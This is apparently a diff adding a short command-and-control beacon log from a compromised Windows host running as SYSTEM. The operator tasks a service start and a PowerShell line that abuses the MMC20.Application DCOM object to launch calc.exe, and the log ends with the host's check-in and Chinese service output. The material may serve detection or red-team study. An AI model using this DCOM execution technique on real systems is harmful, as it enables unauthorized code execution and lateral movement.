@@ -1,0 +1,12 @@
+02/02 15:53:23 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 1196; os: Windows; version: 6.1; beacon arch: x86 (x64)
+02/02 15:58:52 [task] Tasked beacon to run: sc start DcomLaunch
+02/02 15:58:52 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
+02/02 15:59:17 [checkin] host called home, sent: 617 bytes
+02/02 15:59:17 [output]
+received output:
+[SC] StartService 失败 1056:
+
+服务的实例已在运行中。
+
+
+
